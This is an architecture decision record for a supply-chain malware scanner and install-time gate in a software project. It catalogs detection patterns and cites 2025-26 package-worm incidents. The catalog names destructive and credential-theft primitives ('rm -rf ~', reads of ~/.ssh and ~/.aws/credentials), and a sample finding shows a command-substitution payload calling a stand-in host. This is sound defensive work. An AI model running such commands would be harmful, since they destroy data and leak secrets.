# ADR-0062 — Supply-Chain IoC Scanner + Install-Time Gate

- **Status:** Accepted 2026-05-12. **T1 + T2 + T3 + T4 + T5
  shipped** across Bursts 249 (catalog + builtin + tests) +
  250 (install-time gate on `/marketplace/install`,
  `/skills/install`, `/tools/install`) + 257 (forge-stage
  scanner wired into `/skills/forge` + `/tools/forge`;
  REJECTED.md marker + structural gate at the matching
  install endpoints). T6 (frontend Security tab) is the
  final tranche.
- **Date:** 2026-05-12 (drafted same session as the
  Shai-Hulud / MCP-STDIO threat survey).
- **Related:** ADR-0033 (Security Swarm — `security_scan`
  complements `audit_chain_verify`), ADR-0043 (plugin runtime
  — this ADR is what runs on `manifest.yaml` before install),
  ADR-0055 (marketplace — install-time gate ties in here),
  ADR-0057 (Skill Forge — forge-stage scanner gates staged
  output), ADR-0058 (Tool Forge — same), CLAUDE.md §0
  Hippocratic gate (the scanner is read-only first, gating
  second — we report before we refuse).

## Context

Between September 2025 and May 2026 the package-ecosystem
threat landscape changed materially:

- **npm.** Shai-Hulud (Sep 2025) → Shai-Hulud 2.0 (Nov 2025
  — 796 packages, 25K+ malicious GitHub repos) → Mini
  Shai-Hulud (Apr 2026, TanStack/Mistral hit) →
  SANDWORM_MODE (Feb 2026). Self-replicating worms with
  pre-install execution + home-directory-wipe fallback if
  exfil fails.
- **PyPI.** LiteLLM/Telnyx compromise (Apr 2026) shipping
  malicious code on `pip install` that harvested env vars,
  SSH keys, cloud creds. 500-package typosquat campaign,
  two waves.
- **Axios.** North-Korea-nexus UNC1069 compromised a 70M-DL/
  week npm package with a malicious sub-dependency (Mar 2026).
- **MCP.** OX Security disclosed an architectural RCE in
  Anthropic's MCP STDIO transport (Apr 2026) affecting
  ~150M downloads and ~200K vulnerable server instances.
  Researchers poisoned 9 of 11 MCP marketplaces.

Forest's exposure map covers all of these:

| Surface | Risk |
|---|---|
| `/plugins/install` (ADR-0043) | Receives `manifest.yaml` declaring MCP-server `command:` strings — analogous to the npm/PyPI install-time execution surface AND the MCP-STDIO RCE pattern. |
| `/tools/forge` (ADR-0058) | LLM-emitted Python that imports our runtime. A compromised model output could harvest env vars or beacon home. |
| `/skills/forge` (ADR-0057) | LLM-emitted YAML manifest. Less code-execution risk than tools but still chains tool calls. |
| `/marketplace/install` (ADR-0055) | Per ADR-0055 Phase A operators install third-party plugins from a centralized index. Index entries aren't yet signed; a poisoned entry is a worm vector. |
| `pyproject.toml` | Forest's own dependency surface. Compromised upstream → daemon-level RCE. |

Today the operator surfaces have **no content scanner**. We
have ADR-0033 audit-chain integrity, ADR-0043 trust tiers,
ADR-0060 per-tool grants — all *after-install* governance.
What we lack is **pre-install detection**.

## Decisions

### Decision 1 — In-repo IoC pattern catalog

The pattern catalog lives at `config/security_iocs.yaml`
under version control. Three reasons:

1. **Auditability.** Every change to the catalog is a
   git commit + a reviewable diff. No "scanner silently got
   smarter overnight" mystery for operators.
2. **Reproducibility.** A given Forest commit always scans
   with the same rules. Old chains are re-scannable with
   the rules-of-that-day.
3. **Forkability.** ELv2-licensed users can extend or
   override the catalog in their own repo without touching
   the binary.

Each rule has: `id`, `severity` (INFO | LOW | MEDIUM | HIGH
| CRITICAL), `pattern` (regex), `applies_to` (file glob
list), `references` (CVE/blog URL list), and a
`rationale` line. The rule format mirrors Semgrep's metadata
shape (without semgrep-specific YAML extensions) so a future
ADR can swap the scanner backend without breaking the
catalog.

The initial catalog covers (drawn directly from the 2025-26
post-incident IOC publications):

- **CRITICAL.** Pre-install scripts with arbitrary shell
  metacharacters (`$(...)`, backticks, `&&`, `|`, `;`)
  in package manifest `command` / `script` fields. Direct
  match to the MCP STDIO RCE + npm install-script worm.
- **CRITICAL.** Home-directory wipe primitives
  (`rm -rf ~`, `shutil.rmtree(Path.home())`,
  `os.system('rm -rf /')`).
- **HIGH.** Credential-harvest patterns: `os.environ`
  enumeration into a network call, `~/.aws/credentials` or
  `~/.ssh/` reads, GitHub token regex, AWS access-key
  regex, Slack token regex.
- **HIGH.** Network beacon to short-lived domains
  (`*.workers.dev`, `*.ngrok.io`, `*.trycloudflare.com`,
  numeric IPs in code).
- **MEDIUM.** `eval(atob(...))` / `exec(base64.b64decode(...))`
  obfuscation patterns.
- **MEDIUM.** `subprocess.*` with `shell=True` and a
  variable-substituted command string.
- **LOW.** `requests.get(...)` over plain HTTP (not HTTPS)
  in installed code — leak surface, not necessarily
  malicious.
- **INFO.** Unpinned dependency in `pyproject.toml`
  (no `==X.Y.Z` specifier) — Shai-Hulud-style risk amplifier.

### Decision 2 — `security_scan.v1` builtin tool

A read-only builtin tool that takes a `scan_kind` enum +
optional `scan_paths` override, walks the relevant artifact
directories, applies the IoC catalog, and returns structured
findings. Kinds:

| `scan_kind` | What it scans |
|---|---|
| `plugins` | `data/plugins/*/` — each installed plugin's `manifest.yaml` + sibling `*.py` files |
| `forged_tools` | `data/forge/tools/installed/*.py` — every LLM-forged installed tool |
| `forged_skills` | `data/forge/skills/installed/*.yaml` — every installed skill manifest |
| `pyproject` | `pyproject.toml` — Forest's own dependency surface |
| `all` | Union of the above |

Output shape:

```json
{
  "scan_kind": "all",
  "scanned_path_count": 42,
  "findings": [
    {
      "severity": "CRITICAL",
      "pattern_id": "mcp_stdio_rce",
      "file": "data/plugins/foo/manifest.yaml",
      "line": 12,
      "evidence_excerpt": "command: \"node $(curl evil.example.com/x)\"",
      "rationale": "MCP STDIO config-to-command RCE pattern (OX Security 2026-04)",
      "references": ["https://thehackernews.com/2026/04/anthropic-mcp..."]
    }
  ],
  "by_severity": { "CRITICAL": 1, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0 },
  "scanned_paths": ["data/plugins/foo/", ...]
}
```

`side_effects=read_only` — same posture as
`audit_chain_verify.v1`. Any agent in any genre can run it;
no posture gating needed.

The tool is **report-only in B249** — it produces findings
but does not refuse anything. This is the §0 Hippocratic
gate applied to ourselves: prove harm (find CRITICAL real-
world matches against staged manifests) BEFORE wiring the
refusal path.

### Decision 3 — Pattern matching strategy

Pure-regex first, AST-aware second. Three reasons regex
wins for v1:

1. **Catalog portability.** A regex is a portable string an
   operator can read + audit. An AST visitor is opaque to
   non-Python operators.
2. **Cross-language coverage.** Forest plugin manifests can
   declare commands for any language; regex matches the
   string the operator sees.
3. **Fast.** A 100-rule catalog × 100 files runs in <100ms.
   No async needed.

The downside is false positives — a pattern like
`subprocess.run(shell=True` matches benign legitimate code
in some contexts. We accept this in v1 because:

- Findings are SEVERITY-tagged so an operator sees the
  HIGH/CRITICAL ones first.
- The catalog is version-controlled — adding
  `not_matches_when:` exclusions to specific rules is a
  one-PR fix.
- A future ADR can layer a tree-sitter / Bandit / Semgrep
  pass on top of the regex first-pass without breaking the
  catalog contract.

### Decision 4 — Install-time gate (T4, queued)

When the scanner has been exercised against real plugins
for a burst or two and we trust the false-positive rate,
B250 will wire it into `/plugins/install` and
`/marketplace/install`. Pre-install: run the scanner. If
any CRITICAL finding, refuse install with the finding list
in the response body. HIGH findings produce a warning
header (`X-FSF-Security-Warnings: 3`) but install proceeds
unless `?strict=true`.

### Decision 5 — Audit chain integration

The scanner emits one `agent_security_scan_completed` event
per run carrying: scan_kind, scanned_path_count, finding
counts by severity, and the head fingerprint of the scanned
paths (sha256 over the sorted file list). The fingerprint
lets an operator answer "did anything change between
yesterday's scan and today's?" by comparing two events.

## Tranches

| # | Tranche | Description | Status |
|---|---|---|---|
| T1 | IoC pattern catalog | `config/security_iocs.yaml` — initial rule set drawn from Shai-Hulud + MCP-STDIO + LiteLLM/Telnyx + Axios incident IOCs. Schema: id, severity, pattern, applies_to, references, rationale. | shipping B249 |
| T2 | `security_scan.v1` builtin | `src/forest_soul_forge/tools/builtin/security_scan.py`. Args: `scan_kind` + optional `scan_paths`. Output: findings + by-severity counts + scanned-paths list. side_effects=read_only. | shipping B249 |
| T3 | Tool catalog registration + tests | Register in `config/tool_catalog.yaml`. Tests cover each pattern category, kind dispatch, no-findings happy path. | shipping B249 |
| T4 | Install-time gate | **DONE B250** — `daemon/install_scanner.py::scan_install_or_refuse` wraps `security_scan.v1`. Wired into three endpoints: `/marketplace/install`, `/skills/install`, `/tools/install`. Each request body grew a `strict: bool` flag (default False). CRITICAL findings refuse with a 409 carrying the structured findings list; HIGH findings refuse only when `strict=true`, otherwise surface in the success response under `scan_summary`. Every gate decision emits `agent_security_scan_completed` to the audit chain with per-severity counts + scan_fingerprint + decision. KNOWN_EVENT_TYPES updated. | shipped |
| T5 | Forge-stage scanner | **DONE B257** — new helper `daemon/forge_stage_scanner.py::scan_forge_stage_or_refuse` wraps the install-scanner gate with two differences: (a) `install_kind` is `forge_skill_stage` / `forge_tool_stage` so chain queries separate stage refusals from install refusals, and (b) on CRITICAL refusal it writes a human-readable `REJECTED.md` into the staged dir documenting the findings + the operator's remediation options. Wired into both `/skills/forge` and `/tools/forge` between engine return and audit emit. The install endpoints (`/skills/install`, `/tools/install`) gained a `staged_dir_is_quarantined()` structural check: 409 if `REJECTED.md` is present, forcing operator to consciously delete it to bypass. HIGH/MEDIUM/LOW findings flow through to `ForgedSkillOut.scan_summary` / `ForgedToolOut.scan_summary` so the propose-card UI can surface a warning chip. 12 unit tests cover allow / refuse / REJECTED.md content / quarantine predicate / audit emission across both surfaces. | shipped |
| T6 | Frontend Security tab | SoulUX gets a Security tab showing the latest scan findings + a Run Scan Now button. | queued B252 |
| T7 | Pattern-catalog auto-update | Optional scheduled task that pulls the latest catalog from a Forest-signed feed (ADR-0061 operator master signs the feed) and runs a diff against the in-repo catalog. Operator approves the diff. | future |

## Consequences

**Positive:**

- Operators get concrete pre-install signal against the
  exact attack patterns making news.
- The catalog being in-repo means every change is
  reviewable, version-controlled, and forkable.
- Read-only scanner first → install-time gate later
  matches the §0 Hippocratic gate; we don't refuse before
  we've proven the rules don't false-positive on legitimate
  artifacts.
- Pairs cleanly with ADR-0033 audit_chain_verify + ADR-0049
  signatures — a chain entry pointing at a security scan
  result becomes part of the tamper-evident record.

**Negative:**

- Regex-based scanner has false positives. Mitigated by
  severity tiers + catalog being editable.
- New maintenance burden: when a new attack pattern hits
  the news, someone has to write a rule. The mitigation is
  pattern auto-update (T7) on a future burst.
- Doesn't catch novel attacks the catalog hasn't seen yet.
  This is the unavoidable limit of any signature-based
  approach; complementary defenses (sandboxing, audit, posture
  tiers) are the second line.

**Risks accepted:**

- The scanner reading manifest YAML at install time adds a
  few hundred ms to install latency. Acceptable — the
  alternative is "an attacker's code runs first."
- A determined attacker can obfuscate around the catalog.
  The point of the scanner is to catch the 80% common-pattern
  attacks fast + cheap; sophisticated targeted attacks are a
  different threat tier that ADR-0050 (encryption-at-rest) +
  ADR-0051 (per-tool subprocess sandbox) address.

## Out of scope

- Network egress monitoring. That's an OS-level concern.
- Runtime instrumentation (LD_PRELOAD-style). Out of scope
  for a Python daemon; defense-in-depth via the per-tool
  sandbox ADR-0051 (queued) is the right slot.
- Full SBOM generation. Useful but separate ADR.

## Implementation notes

- The catalog is loaded ONCE per scan invocation (no
  process-wide cache) so an operator editing
  `config/security_iocs.yaml` sees the new rule on the next
  scan, no daemon restart needed.
- Rule errors (bad regex) are surfaced as a separate
  warning in the scan output rather than crashing the run —
  one bad rule shouldn't kill the whole scan.
- `applies_to` is a glob list; an empty list means "all
  text files." Defensive default — a rule that forgets to
  scope itself still runs everywhere rather than nowhere.

## References

- Shai-Hulud npm worm timeline (Sep-Nov 2025): https://unit42.paloaltonetworks.com/npm-supply-chain-attack/
- Shai-Hulud 2.0 analysis (Datadog Security Labs):
  https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/
- Mini Shai-Hulud TanStack hit (Aikido, Apr 2026):
  https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised
- Anthropic MCP STDIO RCE disclosure (The Hacker News, Apr 2026):
  https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html
- OX Security MCP supply-chain disclosure:
  https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/
- LiteLLM/Telnyx PyPI incident (PyPI Blog, Apr 2026):
  https://blog.pypi.org/posts/2026-04-02-incident-report-litellm-telnyx-supply-chain-attack/
- Axios npm compromise (Microsoft Security, Apr 2026):
  https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/
